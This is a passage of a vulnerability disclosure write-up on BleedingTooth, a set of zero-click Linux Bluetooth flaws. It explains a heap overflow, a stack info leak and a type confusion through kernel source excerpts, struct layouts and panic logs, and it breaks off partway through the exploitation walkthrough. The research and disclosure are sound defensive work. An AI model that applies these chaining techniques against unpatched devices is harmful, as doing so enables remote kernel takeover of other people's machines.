# BleedingTooth: Linux Bluetooth Zero-Click Remote Code Execution

_BleedingTooth_ is a set of zero-click vulnerabilities in the Linux Bluetooth subsystem that can allow an unauthenticated remote attacker in short distance to execute arbitrary code with kernel privileges on vulnerable devices.

## Table of Contents

- [Introduction](#introduction)
  * [Patching, Severity and Advisories](#patching-severity-and-advisories)
- [Vulnerabilities](#vulnerabilities)
  * [BadVibes: Heap-Based Buffer Overflow (CVE-2020-24490)](#badvibes-heap-based-buffer-overflow-cve-2020-24490)
  * [BadChoice: Stack-Based Information Leak (CVE-2020-12352)](#badchoice-stack-based-information-leak-cve-2020-12352)
  * [BadKarma: Heap-Based Type Confusion (CVE-2020-12351)](#badkarma-heap-based-type-confusion-cve-2020-12351)
- [Exploitation](#exploitation)
  * [Bypassing BadKarma](#bypassing-badkarma)
  * [Exploring sk_filter()](#exploring-sk_filter)
  * [Finding a Heap Primitive](#finding-a-heap-primitive)
  * [Controlling the Out-Of-Bounds Read](#controlling-the-out-of-bounds-read)
  * [Leaking the Memory Layout](#leaking-the-memory-layout)
  * [Plugging It All Together](#plugging-it-all-together)
    + [Achieving RIP Control](#achieving-rip-control)
    + [Kernel Stack Pivoting](#kernel-stack-pivoting)
    + [Kernel ROP Chain Execution](#kernel-rop-chain-execution)
- [Proof-Of-Concept](#proof-of-concept)
- [Timeline](#timeline)
- [Conclusion](#conclusion)
- [Thanks](#thanks)

## Introduction

I noticed that the network subsystem was already being fuzzed extensively by [syzkaller](https://github.com/google/syzkaller), but that subsystems like Bluetooth were less well covered. In general, research on the Bluetooth host attack surface seemed to be quite limited – with most public vulnerabilities in Bluetooth only affecting the [firmware](https://www.armis.com/bleedingbit/) or the [specification](https://knobattack.com/) itself, and only allowing attackers to eavesdrop and/or manipulate information.

But what if attackers could take full control over devices? The most prominent examples that demonstrated this scenario were [BlueBorne](https://www.armis.com/blueborne/) and [BlueFrag](https://insinuator.net/2020/04/cve-2020-0022-an-android-8-0-9-0-bluetooth-zero-click-rce-bluefrag/). I set myself the goal to research the Linux Bluetooth stack, to extend upon BlueBorne’s findings, and to extend syzkaller with the capability to fuzz the `/dev/vhci` device.

This blogpost describes the process of me diving into the code, uncovering high severity vulnerabilities, and ultimately chaining them into a fully-fledged RCE exploit targeting x86-64 Ubuntu 20.04.1 ([video](https://youtu.be/qPYrLRausSw)).

### Patching, Severity and Advisories

Google reached out directly to [BlueZ](http://www.bluez.org/) and the Linux Bluetooth Subsystem maintainers (Intel), rather than to the Linux Kernel Security team in order to coordinate the multi-party response for this series of vulnerabilities. Intel issued the security advisory [INTEL-SA-00435](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00435.html) with the patches, but these weren't included in any released Kernel versions at the time of disclosure. The Linux Kernel Security team should have been notified in order to facilitate coordination, and any future vulnerabilities of this type will also be reported to them. A timeline of the communications is at the bottom of this post. The patches for the respective vulnerabilities are:

* [BadVibes](https://github.com/google/security-research/security/advisories/GHSA-ccx2-w2r4-x649) (CVE-2020-24490) was fixed on the mainline branch on 2020-Jul-30: [commit.](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=a2ec905d1e160a33b2e210e45ad30445ef26ce0e)
* [BadChoice](https://github.com/google/security-research/security/advisories/GHSA-7mh3-gq28-gfrq) (CVE-2020-12352) and [BadKarma](https://github.com/google/security-research/security/advisories/GHSA-h637-c88j-47wq) (CVE-2020-12351) were fixed on bluetooth-next on 2020-Sep-25: commits [1](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=eddb7732119d53400f48a02536a84c509692faa8), [2](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=f19425641cb2572a33cb074d5e30283720bd4d22), [3](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b176dd0ef6afcb3bca24f41d78b0d0b731ec2d08), [4](https://git.kernel.org/pub/scm/linux/kernel/git/bluetooth/bluetooth-next.git/commit/?id=b560a208cda0297fef6ff85bbfd58a8f0a52a543)

Alone, the severity of these vulnerabilities **vary from medium to high, but combined they represent a serious security risk.** This write-up goes over these risks.

## Vulnerabilities

Let's briefly describe the Bluetooth stack. The Bluetooth chip communicates with the host (the operating system) using the HCI (Host Controller Interface) protocol. Common packets are:

* Command packets – Sent by the host to the controller.
* Event packets – Sent by the controller to the host to notify about events.
* Data packets – Usually carry L2CAP (Logical Link Control and Adaptation protocol) packets, which implement the transport layer.

Higher-level protocols such as A2MP (AMP Manager Protocol) or SMP (Security Management Protocol) are built on top of L2CAP. In the Linux implementation, all these protocols are exposed without authentication, and vulnerabilities there are crucial since some of these protocols even live inside the kernel.

### BadVibes: Heap-Based Buffer Overflow (CVE-2020-24490)

I discovered the first vulnerability (introduced in Linux kernel 4.19) by manually reviewing the HCI event packet parsers. HCI event packets are crafted and sent by the Bluetooth chip and usually cannot be controlled by attackers (unless they have control over the Bluetooth firmware as well). However, there are two very similar methods, `hci_le_adv_report_evt()` and `hci_le_ext_adv_report_evt()`, whose purposes are to parse advertisement reports coming from remote Bluetooth devices. These reports are variable in size.

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void hci_le_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
	u8 num_reports = skb->data[0];
	void *ptr = &skb->data[1];

	hci_dev_lock(hdev);

	while (num_reports--) {
		struct hci_ev_le_advertising_info *ev = ptr;
		s8 rssi;

		if (ev->length <= HCI_MAX_AD_LENGTH) {
			rssi = ev->data[ev->length];
			process_adv_report(hdev, ev->evt_type, &ev->bdaddr,
					   ev->bdaddr_type, NULL, 0, rssi,
					   ev->data, ev->length);
		} else {
			bt_dev_err(hdev, "Dropping invalid advertising data");
		}

		ptr += sizeof(*ev) + ev->length + 1;
	}

	hci_dev_unlock(hdev);
}
...
static void hci_le_ext_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
	u8 num_reports = skb->data[0];
	void *ptr = &skb->data[1];

	hci_dev_lock(hdev);

	while (num_reports--) {
		struct hci_ev_le_ext_adv_report *ev = ptr;
		u8 legacy_evt_type;
		u16 evt_type;

		evt_type = __le16_to_cpu(ev->evt_type);
		legacy_evt_type = ext_evt_type_to_legacy(hdev, evt_type);
		if (legacy_evt_type != LE_ADV_INVALID) {
			process_adv_report(hdev, legacy_evt_type, &ev->bdaddr,
					   ev->bdaddr_type, NULL, 0, ev->rssi,
					   ev->data, ev->length);
		}

		ptr += sizeof(*ev) + ev->length;
	}

	hci_dev_unlock(hdev);
}
```

Notice how both methods call `process_adv_report()`, but the latter method does not check `ev->length` to see if it is smaller or equal to `HCI_MAX_AD_LENGTH=31`. The function `process_adv_report()` then invokes `store_pending_adv_report()` with the event data and length:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void process_adv_report(struct hci_dev *hdev, u8 type, bdaddr_t *bdaddr,
			       u8 bdaddr_type, bdaddr_t *direct_addr,
			       u8 direct_addr_type, s8 rssi, u8 *data, u8 len)
{
	...
	if (!has_pending_adv_report(hdev)) {
		...
		if (type == LE_ADV_IND || type == LE_ADV_SCAN_IND) {
			store_pending_adv_report(hdev, bdaddr, bdaddr_type,
						 rssi, flags, data, len);
			return;
		}
		...
	}
	...
}
```

Finally, the `store_pending_adv_report()` subroutine copies the data into `d->last_adv_data`:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void store_pending_adv_report(struct hci_dev *hdev, bdaddr_t *bdaddr,
				     u8 bdaddr_type, s8 rssi, u32 flags,
				     u8 *data, u8 len)
{
	struct discovery_state *d = &hdev->discovery;
	...
	memcpy(d->last_adv_data, data, len);
	d->last_adv_data_len = len;
}
```

Looking at `struct hci_dev`, we can see that the buffer `last_adv_data` has the same size as `HCI_MAX_AD_LENGTH` which is not enough to hold the extended advertising data. The parser can theoretically receive and route a packet up to 255 bytes to this method. If that is possible, we could overflow `last_adv_data` and corrupt members up to offset 0xbaf.

```c
// pahole -E -C hci_dev --hex bluetooth.ko
struct hci_dev {
	...
	struct discovery_state {
		...
		/* typedef u8 -> __u8 */ unsigned char      last_adv_data[31];           /* 0xab0  0x1f */
		...
	} discovery; /* 0xa68  0x88 */
	...
	struct list_head {
		struct list_head * next;                                                 /* 0xb18   0x8 */
		struct list_head * prev;                                                 /* 0xb20   0x8 */
	} mgmt_pending; /* 0xb18  0x10 */
	...
	/* size: 4264, cachelines: 67, members: 192 */
	/* sum members: 4216, holes: 17, sum holes: 48 */
	/* paddings: 10, sum paddings: 43 */
	/* forced alignments: 1 */
	/* last cacheline: 40 bytes */
} __attribute__((__aligned__(8)));
```

However, is `hci_le_ext_adv_report_evt()` even able to receive such a large report? It is likely that larger advertisements are anticipated, because it seems intentional that the extended advertisement parser explicitly removed the 31 bytes check. Also, since it is close to `hci_le_adv_report_evt()` in code, that check has likely not been forgotten by mistake. Indeed, looking at the specification, we can see that extending from 31 bytes to 255 bytes is one of Bluetooth 5’s main features:

> Recall in Bluetooth 4.0, the advertising payload was a maximum of 31 octets. In Bluetooth 5, we’ve increased the payload to 255 octets by adding additional advertising channels and new advertising PDUs.  
> Source: [https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/](https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/)

Therefore, this vulnerability is only triggerable if the victim's machine has a Bluetooth 5 chip (which is relatively "new" technology and only available on newer Laptops) and if the victim is actively scanning for advertisement data (i.e. open the Bluetooth settings and search for devices in the surrounding).

Using two Bluetooth 5-capable devices, we can easily confirm the vulnerability and observe a panic similar to:

```
[  118.490999] general protection fault: 0000 [#1] SMP PTI
[  118.491006] CPU: 6 PID: 205 Comm: kworker/u17:0 Not tainted 5.4.0-37-generic #41-Ubuntu
[  118.491008] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  118.491034] Workqueue: hci0 hci_rx_work [bluetooth]
[  118.491056] RIP: 0010:hci_bdaddr_list_lookup+0x1e/0x40 [bluetooth]
[  118.491060] Code: ff ff e9 26 ff ff ff 0f 1f 44 00 00 0f 1f 44 00 00 55 48 8b 07 48 89 e5 48 39 c7 75 0a eb 24 48 8b 00 48 39 f8 74 1c 44 8b 06 <44> 39 40 10 75 ef 44 0f b7 4e 04 66 44 39 48 14 75 e3 38 50 16 75
[  118.491062] RSP: 0018:ffffbc6a40493c70 EFLAGS: 00010286
[  118.491066] RAX: 4141414141414141 RBX: 000000000000001b RCX: 0000000000000000
[  118.491068] RDX: 0000000000000000 RSI: ffff9903e76c100f RDI: ffff9904289d4b28
[  118.491070] RBP: ffffbc6a40493c70 R08: 0000000093570362 R09: 0000000000000000
[  118.491072] R10: 0000000000000000 R11: ffff9904344eae38 R12: ffff9904289d4000
[  118.491074] R13: 0000000000000000 R14: 00000000ffffffa3 R15: ffff9903e76c100f
[  118.491077] FS:  0000000000000000(0000) GS:ffff990434580000(0000) knlGS:0000000000000000
[  118.491079] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  118.491081] CR2: 00007feed125a000 CR3: 00000001b860a003 CR4: 00000000003606e0
[  118.491083] Call Trace:
[  118.491108]  process_adv_report+0x12e/0x560 [bluetooth]
[  118.491128]  hci_le_meta_evt+0x7b2/0xba0 [bluetooth]
[  118.491134]  ? __wake_up_sync_key+0x1e/0x30
[  118.491140]  ? sock_def_readable+0x40/0x70
[  118.491143]  ? __sock_queue_rcv_skb+0x142/0x1f0
[  118.491162]  hci_event_packet+0x1c29/0x2a90 [bluetooth]
[  118.491186]  ? hci_send_to_monitor+0xae/0x120 [bluetooth]
[  118.491190]  ? skb_release_all+0x26/0x30
[  118.491207]  hci_rx_work+0x19b/0x360 [bluetooth]
[  118.491211]  ? __schedule+0x2eb/0x740
[  118.491217]  process_one_work+0x1eb/0x3b0
[  118.491221]  worker_thread+0x4d/0x400
[  118.491225]  kthread+0x104/0x140
[  118.491229]  ? process_one_work+0x3b0/0x3b0
[  118.491232]  ? kthread_park+0x90/0x90
[  118.491236]  ret_from_fork+0x35/0x40
```

The panic shows that we can take full control over members within `struct hci_dev`. An interesting pointer to corrupt is `mgmt_pending->next`, as it is of the type `struct mgmt_pending_cmd` which contains the function pointer `cmd_complete()`:

```c
// pahole -E -C mgmt_pending_cmd --hex bluetooth.ko
struct mgmt_pending_cmd {
	...
	int                        (*cmd_complete)(struct mgmt_pending_cmd *, u8);       /*  0x38   0x8 */

	/* size: 64, cachelines: 1, members: 8 */
	/* sum members: 62, holes: 1, sum holes: 2 */
};
```

This handler can, for example, be triggered by aborting the HCI connection. However, in order to successfully redirect the `mgmt_pending->next` pointer, we require an additional information leak vulnerability, as we will learn in the next section.

### BadChoice: Stack-Based Information Leak (CVE-2020-12352)

The _BadVibes_ vulnerability is not powerful enough to be turned into arbitrary R/W primitives, and there seems to be no way to use it to leak the memory layout of the victim. The reason is that the only interesting members that can be corrupted are pointers to circular lists. As the name suggests, these data structures are circular, thus we cannot alter them without ensuring that they eventually point back to where they started. This requirement is hard to fulfil when the memory layout of the victim is randomized. While there are some resources in the kernel that are allocated at static addresses, their contents are most likely not controllable. Therefore, we need to have an idea of the memory layout in the first place in order to exploit _BadVibes_. To be more concrete, we need to leak some memory addresses of the victim, whose content we can control or at least predict.

Usually, information leaks are achieved by exploiting out-of-bounds accesses, making use of uninitialized variables, or, as recently popular, by performing side-channel/timing attacks. The latter may be difficult to pull off, as transmissions may have jitter. Instead, let’s focus on the first two bug classes and go through all subroutines that send back some information to the attacker, and see if any of them can disclose out-of-bounds data or uninitialized memory.

I discovered the second vulnerability in the command `A2MP_GETINFO_REQ` of the A2MP protocol by going through all `a2mp_send()` invocations. The vulnerability has existed since Linux kernel 3.6 and is reachable if `CONFIG_BT_HS=y` which used to be enabled by default.

Let’s take a look at the subroutine `a2mp_getinfo_req()` invoked by the `A2MP_GETINFO_REQ` command:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
			    struct a2mp_cmd *hdr)
{
	struct a2mp_info_req *req  = (void *) skb->data;
	...
	hdev = hci_dev_get(req->id);
	if (!hdev || hdev->dev_type != HCI_AMP) {
		struct a2mp_info_rsp rsp;

		rsp.id = req->id;
		rsp.status = A2MP_STATUS_INVALID_CTRL_ID;

		a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
			  &rsp);

		goto done;
	}
	...
}
```

The subroutine is meant to request information about the AMP controller using the HCI device id. However, if it is invalid or not of the type `HCI_AMP`, the error path is taken, meaning that the victim sends us back the status `A2MP_STATUS_INVALID_CTRL_ID`. Unfortunately, the `struct a2mp_info_rsp` consists of more members than just the id and the status, and as we can see, the response structure is not fully initialized. As a consequence, 16 bytes of kernel stack can be disclosed to the attacker which may contain sensitive data of the victim:

```c
// pahole -E -C a2mp_info_rsp --hex bluetooth.ko
struct a2mp_info_rsp {
	/* typedef __u8 */ unsigned char              id;                                /*     0   0x1 */
	/* typedef __u8 */ unsigned char              status;                            /*   0x1   0x1 */
	/* typedef __le32 -> __u32 */ unsigned int               total_bw;               /*   0x2   0x4 */
	/* typedef __le32 -> __u32 */ unsigned int               max_bw;                 /*   0x6   0x4 */
	/* typedef __le32 -> __u32 */ unsigned int               min_latency;            /*   0xa   0x4 */
	/* typedef __le16 -> __u16 */ short unsigned int         pal_cap;                /*   0xe   0x2 */
	/* typedef __le16 -> __u16 */ short unsigned int         assoc_size;             /*  0x10   0x2 */

	/* size: 18, cachelines: 1, members: 7 */
	/* last cacheline: 18 bytes */
} __attribute__((__packed__));
```

Such a vulnerability can be exploited by sending interesting commands to populate the stack frame prior to sending `A2MP_GETINFO_REQ`. Here, interesting commands are those that put pointers in the same stack frame that `a2mp_getinfo_req()` reuses. By doing so, uninitialized variables may end up containing pointers previously pushed onto the stack.

Note that kernels compiled with `CONFIG_INIT_STACK_ALL_PATTERN=y` should not be vulnerable to such attacks. For example, on ChromeOS, _BadChoice_ only returns 0xAA's. However, this option does not seem to be enabled by default yet on popular Linux distros.

### BadKarma: Heap-Based Type Confusion (CVE-2020-12351)

I discovered the third vulnerability while attempting to trigger _BadChoice_ and confirm its exploitability. Namely, the victim's machine unexpectedly crashed with the following call trace:

```
[  445.440736] general protection fault: 0000 [#1] SMP PTI
[  445.440740] CPU: 4 PID: 483 Comm: kworker/u17:1 Not tainted 5.4.0-40-generic #44-Ubuntu
[  445.440741] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  445.440764] Workqueue: hci0 hci_rx_work [bluetooth]
[  445.440771] RIP: 0010:sk_filter_trim_cap+0x6d/0x220
[  445.440773] Code: e8 18 e1 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 4c 8b 78 18 48 89 4d b0 <41> f6 47 02 08 0f 85 41 01 00 00 0f 1f 44 00 00 49 8b 47 30 49 8d
[  445.440776] RSP: 0018:ffffa86b403abca0 EFLAGS: 00010286
[  445.440778] RAX: ffffffffc071cc50 RBX: ffff8e95af6d7000 RCX: 0000000000000000
[  445.440780] RDX: 0000000000000000 RSI: ffff8e95ac533800 RDI: ffff8e95af6d7000
[  445.440781] RBP: ffffa86b403abd00 R08: ffff8e95b452f0e0 R09: ffff8e95b34072c0
[  445.440782] R10: ffff8e95acd57818 R11: ffff8e95b456ae38 R12: ffff8e95ac533800
[  445.440784] R13: 0000000000000000 R14: 0000000000000001 R15: 30478b4800000208
[  445.440786] FS:  0000000000000000(0000) GS:ffff8e95b4500000(0000) knlGS:0000000000000000
[  445.440788] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  445.440789] CR2: 000055f371aa94a8 CR3: 000000022dc0a005 CR4: 00000000003606e0
[  445.440791] Call Trace:
[  445.440817]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[  445.440838]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[  445.440857]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[  445.440875]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[  445.440878]  ? skb_release_all+0x26/0x30
[  445.440896]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[  445.440914]  hci_rx_work+0x186/0x360 [bluetooth]
[  445.440919]  process_one_work+0x1eb/0x3b0
[  445.440921]  worker_thread+0x4d/0x400
[  445.440924]  kthread+0x104/0x140
[  445.440927]  ? process_one_work+0x3b0/0x3b0
[  445.440929]  ? kthread_park+0x90/0x90
[  445.440932]  ret_from_fork+0x35/0x40
```

Taking a look at l2cap_data_rcv(), we can see that sk_filter() is invoked when ERTM (Enhanced Retransmission Mode) or streaming mode is used (similar to TCP):

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
	...
	if ((chan->mode == L2CAP_MODE_ERTM ||
	     chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb))
		goto drop;
	...
}
```

This is indeed the case for the A2MP channel (channels can be compared with network ports):

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
	struct l2cap_chan *chan;
	int err;

	chan = l2cap_chan_create();
	if (!chan)
		return NULL;
	...
	chan->mode = L2CAP_MODE_ERTM;
	...
	return chan;
}
...
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
	struct amp_mgr *mgr;
	struct l2cap_chan *chan;

	mgr = kzalloc(sizeof(*mgr), GFP_KERNEL);
	if (!mgr)
		return NULL;
	...
	chan = a2mp_chan_open(conn, locked);
	if (!chan) {
		kfree(mgr);
		return NULL;
	}

	mgr->a2mp_chan = chan;
	chan->data = mgr;
	...
	return mgr;
}
```

Looking at `amp_mgr_create()`, it is clear where the mistake is. Namely, `chan->data` is of the type `struct amp_mgr`, whereas `sk_filter()` takes an argument of the type `struct sock`, meaning that we have a remote type confusion by design. This confusion was introduced in Linux kernel 4.8 and since then has remained unchanged.

## Exploitation

The _BadChoice_ vulnerability can be chained with _BadVibes_ as well as _BadKarma_ to achieve RCE. In this blogpost, we will only focus on the method using _BadKarma_, for the following reasons:

* It is not limited to Bluetooth 5.
* It does not require the victim to be scanning.
* It is possible to perform a targeted attack on a specific device. 

The _BadVibes_ attack, on the other hand, is a broadcast only, thus only one machine could be successfully exploited while all other machines listening to the same message would simply crash.

### Bypassing BadKarma

Ironically, in order to exploit _BadKarma_, we must first get rid of _BadKarma_. Recall that there is a type confusion bug by design, and as long as the A2MP channel is configured as ERTM/streaming mode, we cannot reach the A2MP subroutines via `l2cap_data_rcv()` without triggering the panic in `sk_filter()`.

Looking at `l2cap_data_channel()`, we can see that the only possible way to take a different route is to reconfigure the channel mode to `L2CAP_MODE_BASIC`. This would "basically" allow us to invoke the A2MP receive handler directly:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
			       struct sk_buff *skb)
{
	struct l2cap_chan *chan;

	chan = l2cap_get_chan_by_scid(conn, cid);
	...
	switch (chan->mode) {
	...
	case L2CAP_MODE_BASIC:
		/* If socket recv buffers overflows we drop data here
		 * which is *bad* because L2CAP has to be reliable.
		 * But we don't have any other choice. L2CAP doesn't
		 * provide flow control mechanism. */

		if (chan->imtu < skb->len) {
			BT_ERR("Dropping L2CAP data: receive buffer overflow");
			goto drop;
		}

		if (!chan->ops->recv(chan, skb))
			goto done;
		break;

	case L2CAP_MODE_ERTM:
	case L2CAP_MODE_STREAMING:
		l2cap_data_rcv(chan, skb);
		goto done;
	...
	}
	...
}
```

However, is the reconfiguration of the channel mode even possible? According to the specification, the use of ERTM or streaming mode is mandatory for the A2MP channel:

> The Bluetooth Core maintains a level of reliability for protocols and profiles above the Core by mandating the use of Enhanced Retransmission Mode or Streaming Mode for any L2CAP channel used over the AMP.  
> Source: [https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx?doc_id=421043](https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx?doc_id=421043)

For some reason, this fact is not described in the specification and the implementation of Linux actually allows us to switch from any channel mode to `L2CAP_MODE_BASIC` by encapsulating the desired channel mode in the `L2CAP_CONF_UNACCEPT` configuration response:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c`
static inline int l2cap_config_rsp(struct l2cap_conn *conn,
				   struct l2cap_cmd_hdr *cmd, u16 cmd_len,
				   u8 *data)
{
	struct l2cap_conf_rsp *rsp = (struct l2cap_conf_rsp *)data;
	...
	scid   = __le16_to_cpu(rsp->scid);
	flags  = __le16_to_cpu(rsp->flags);
	result = __le16_to_cpu(rsp->result);
	...
	chan = l2cap_get_chan_by_scid(conn, scid);
	if (!chan)
		return 0;

	switch (result) {
	...
	case L2CAP_CONF_UNACCEPT:
		if (chan->num_conf_rsp <= L2CAP_CONF_MAX_CONF_RSP) {
			...
			result = L2CAP_CONF_SUCCESS;
			len = l2cap_parse_conf_rsp(chan, rsp->data, len,
						   req, sizeof(req), &result);
			...
		}
		fallthrough;
	...
	}
	...
}
```

This function invokes the subroutine `l2cap_parse_conf_rsp()`. There, if the option type `L2CAP_CONF_RFC` is specified, and the current channel mode is not `L2CAP_MODE_BASIC`, it is possible to change it to our desire:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
				void *data, size_t size, u16 *result)
{
	...
	while (len >= L2CAP_CONF_OPT_SIZE) {
		len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
		if (len < 0)
			break;

		switch (type) {
		...
		case L2CAP_CONF_RFC:
			if (olen != sizeof(rfc))
				break;
			memcpy(&rfc, (void *)val, olen);
			...
			break;
		...
		}
	}

	if (chan->mode == L2CAP_MODE_BASIC && chan->mode != rfc.mode)
		return -ECONNREFUSED;

	chan->mode = rfc.mode;
	...
}
```

The natural question hereby is whether we first need to receive a configuration request from the victim before we can send back a configuration response? This seems to be a weakness of the protocol – the answer is no. Moreover, whatever the victim negotiates with us, we can send back a `L2CAP_CONF_UNACCEPT` response and the victim will happily accept our suggestion.

Using the configuration response bypass, we are now able to reach the A2MP commands and exploit _BadChoice_ to retrieve all the information we need (see later sections). Once we are ready to trigger the type confusion, we can simply recreate the A2MP channel by disconnecting and connecting the channel and as such, set the channel mode back to ERTM as required for _BadKarma_.

### Exploring sk_filter()

As we understand, the issue of _BadKarma_ is that a `struct amp_mgr` object is passed to `sk_filter()`, whereas a `struct sock` object is expected. In other words, fields in `struct sock` falsely map to fields in `struct amp_mgr`. As a consequence, this could result in dereferencing invalid pointers and ultimately panic. Looking back at the panic log from before, this is exactly what happened and what primarily led to the discovery of _BadKarma_.

Can we control that pointer dereference, or control other members in `struct amp_mgr` in order to affect the code-flow of `sk_filter()`? Let’s take a look at `sk_filter()` and track the usage of `struct sock *sk` to understand what members are relevant in this subroutine.

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
static inline int sk_filter(struct sock *sk, struct sk_buff *skb)
{
	return sk_filter_trim_cap(sk, skb, 1);
}
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
	int err;
	struct sk_filter *filter;

	/*
	 * If the skb was allocated from pfmemalloc reserves, only
	 * allow SOCK_MEMALLOC sockets to use it as this socket is
	 * helping free memory
	 */
	if (skb_pfmemalloc(skb) && !sock_flag(sk, SOCK_MEMALLOC)) {
		NET_INC_STATS(sock_net(sk), LINUX_MIB_PFMEMALLOCDROP);
		return -ENOMEM;
	}
	err = BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb);
	if (err)
		return err;

	err = security_sock_rcv_skb(sk, skb);
	if (err)
		return err;

	rcu_read_lock();
	filter = rcu_dereference(sk->sk_filter);
	if (filter) {
		struct sock *save_sk = skb->sk;
		unsigned int pkt_len;

		skb->sk = sk;
		pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
		skb->sk = save_sk;
		err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
	}
	rcu_read_unlock();

	return err;
}
```

The first usage of `sk` is in `sock_flag()`, though that function simply checks for some flags and moreover, only occurs if `skb_pfmemalloc()` returns true. Instead, let’s take a look at `BPF_CGROUP_RUN_PROG_INET_INGRESS()` and see what it does with the socket structure:

```c
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf-cgroup.h
#define BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb)			      \
({									      \
	int __ret = 0;							      \
	if (cgroup_bpf_enabled)						      \
		__ret = __cgroup_bpf_run_filter_skb(sk, skb,		      \
						    BPF_CGROUP_INET_INGRESS); \
									      \
	__ret;								      \
})
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/bpf/cgroup.c
int __cgroup_bpf_run_filter_skb(struct sock *sk,
				struct sk_buff *skb,
				enum bpf_attach_type type)
{
	...
	if (!sk || !sk_fullsock(sk))
		return 0;

	if (sk->sk_family != AF_INET && sk->sk_family != AF_INET6)
		return 0;
	...
}
```

Similarly, `sk_fullsock()` also checks for some flags and does not do anything interesting. Going further, note that `sk->sk_family` must be either `AF_INET=2` or `AF_INET6=10` in order to continue. This field is located at offset 0x10 in `struct sock`:

```c
// pahole -E -C sock --hex bluetooth.ko
struct sock {
	struct sock_common {
		...
		short unsigned int skc_family;                                           /*  0x10   0x2 */
		...
	} __sk_common; /*     0  0x88 */
	...
	struct sk_filter *         sk_filter;                                            /* 0x110   0x8 */
	...
	/* size: 760, cachelines: 12, members: 88 */
	/* sum members: 747, holes: 4, sum holes: 8 */
	/* sum bitfield members: 40 bits (5 bytes) */
	/* paddings: 1, sum paddings: 4 */
	/* forced alignments: 1 */
	/* last cacheline: 56 bytes */
} __attribute__((__aligned__(8)));
```

Looking at offset 0x10 in `struct amp_mgr`, we realize that this field maps to the `struct l2cap_conn` pointer:

```c
// pahole -E -C amp_mgr --hex bluetooth.ko
struct amp_mgr {
	...
	struct l2cap_conn *        l2cap_conn;                                           /*  0x10   0x8 */
	...
	/* size: 112, cachelines: 2, members: 11 */
	/* sum members: 110, holes: 1, sum holes: 2 */
	/* last cacheline: 48 bytes */
};
```

As this is a pointer to a heap object which is aligned to the allocation size (minimum 32 bytes), it means that the lower bytes of this pointer cannot have the values 2 or 10 as required by `__cgroup_bpf_run_filter_skb()`. Having established that, we know that the subroutine always returns 0 no matter what values the other fields have. Similarly, the subroutine `security_sock_rcv_skb()` requires the same condition and returns 0 otherwise.

